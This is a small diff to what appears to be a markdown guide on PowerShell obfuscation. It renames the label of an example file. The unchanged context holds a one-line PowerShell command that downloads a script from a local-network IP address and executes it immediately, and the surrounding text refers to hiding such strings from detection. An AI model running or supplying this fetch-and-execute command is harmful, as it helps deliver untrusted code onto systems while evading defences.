@@ -654,7 +654,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 <br />
 
-- File **test.ps1** (trigger download/execution)
+- File **Invoke-WebRequest.ps1** (trigger download/execution)
 
       Invoke-WebRequest "http://192.168.1.71/Invoke-Hello.ps1" -OutFile "Invoke-Hello.ps1" -PassThru; powershell.exe -File Invoke-Hello.ps1
 
